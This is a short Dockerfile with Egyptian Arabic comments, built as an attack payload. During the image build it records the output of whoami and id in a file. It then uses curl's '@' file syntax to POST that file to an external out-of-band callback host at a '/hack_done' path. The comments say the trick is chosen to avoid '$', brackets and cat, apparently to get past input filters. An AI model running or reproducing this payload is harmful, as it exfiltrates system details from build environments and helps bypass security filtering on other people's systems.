FROM alpine:latest

# 1. نزل curl
RUN apk add --no-cache curl

# 2. اكتب النتيجة جوه ملف (ده أمر بسيط مفيهوش غلطة)
RUN whoami > /tmp/result.txt
RUN echo " | " >> /tmp/result.txt
RUN id >> /tmp/result.txt

# 3. الحركة السحرية: علامة @
# دي بتخلي curl هو اللي يقرأ الملف ويبعته POST
# لا استخدمنا $ ولا أقواس ولا cat
RUN curl -X POST --data-binary @/tmp/result.txt http://d52fni83t4gh9b2pkpa0qgh49zgw34b31.oast.pro/hack_done || true
